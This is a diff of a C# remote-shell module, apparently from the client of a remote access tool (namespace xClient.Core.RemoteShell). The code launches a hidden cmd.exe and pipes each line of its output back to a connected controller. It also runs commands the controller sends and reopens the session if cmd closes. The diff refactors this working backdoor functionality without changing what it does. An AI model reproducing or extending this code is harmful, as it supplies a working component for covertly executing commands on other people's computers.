@@ -1,18 +1,17 @@
 ﻿using System;
 using System.Diagnostics;
-using System.Text;
 using System.Threading;
 
 namespace xClient.Core.RemoteShell
 {
     public class Shell
     {
-        private Process prc;
-        private bool read;
+        private Process _prc;
+        private bool _read;
 
         private void CreateSession()
         {
-            prc = new Process
+            _prc = new Process
             {
                 StartInfo = new ProcessStartInfo("cmd")
                 {
@@ -22,12 +21,12 @@ namespace xClient.Core.RemoteShell
                     RedirectStandardError = true,
                     CreateNoWindow = true,
                     WorkingDirectory = @"C:\",
-                    Arguments = "/K",
+                    Arguments = "/K"
                 }
             };
 
-            prc.Start();
-            new Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(Program._Client);
+            _prc.Start();
+            new Packets.ClientPackets.ShellCommandResponse(">> New Session created" + Environment.NewLine).Execute(Program.ConnectClient);
 
             new Thread(Redirect).Start();
         }
@@ -36,91 +35,65 @@ namespace xClient.Core.RemoteShell
         {
             try
             {
-                bool isTestUsed = false;
-                prc.StandardInput.WriteLine("test");
-                prc.StandardInput.Flush();
-                prc.StandardOutput.ReadLine();
-                prc.StandardOutput.ReadLine();
-
-                while (read)
+                using (var reader = _prc.StandardOutput)
                 {
-                    if (read && prc.HasExited)
-                        throw new Exception("session unexpectedly closed");
-
-                    StringBuilder commandResult = new StringBuilder();
-
-                    prc.StandardOutput.ReadLine();
-
-                    while (true)
+                    while (!reader.EndOfStream && _read)
                     {
-                        string line = prc.StandardOutput.ReadLine();
-
-                        if (string.IsNullOrEmpty(line))
-                            break;
-
-                        if (!isTestUsed)
-                        {
-                            isTestUsed = line.Contains("test");
-                            if (isTestUsed)
-                                break;
-                        }
-
-                        commandResult.AppendLine(line);
+                        new Packets.ClientPackets.ShellCommandResponse(reader.ReadLine() + Environment.NewLine).Execute(Program.ConnectClient);
                     }
-
-                    commandResult.AppendLine();
-
-                    new Packets.ClientPackets.ShellCommandResponse(commandResult.ToString()).Execute(Program._Client);
                 }
+
+                if (_prc.HasExited && _read)
+                    throw new ApplicationException("session unexpectedly closed");
             }
-            catch
+            catch (ApplicationException)
             {
+                new Packets.ClientPackets.ShellCommandResponse(">> Session unexpectedly closed" + Environment.NewLine).Execute(Program.ConnectClient);
                 CreateSession();
             }
         }
 
         public bool ExecuteCommand(string command)
         {
-            if (!prc.HasExited)
-            {
-                prc.StandardInput.WriteLine(command);
-                prc.StandardInput.WriteLine();
-                prc.StandardInput.Flush();
-                return true;
-            }
-            return false;
+            if (_prc.HasExited)
+                return false;
+
+            _prc.StandardInput.WriteLine(command);
+            _prc.StandardInput.Flush();
+
+            return true;
         }
 
         public Shell()
         {
-            read = true;
+            _read = true;
             CreateSession();
         }
 
         ~Shell()
         {
-            read = false;
+            _read = false;
             try
             {
-                if (!prc.HasExited)
-                    prc.Kill();
+                if (!_prc.HasExited)
+                    _prc.Kill();
             }
             catch
             { }
-            new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program._Client);
+            new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
         }
 
         public void CloseSession()
         {
-            read = false;
+            _read = false;
             try
             {
-                if (!prc.HasExited)
-                    prc.Kill();
+                if (!_prc.HasExited)
+                    _prc.Kill();
             }
             catch
             { }
-            new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program._Client);
+            new Packets.ClientPackets.ShellCommandResponse(">> Session closed" + Environment.NewLine).Execute(Program.ConnectClient);
         }
     }
 }
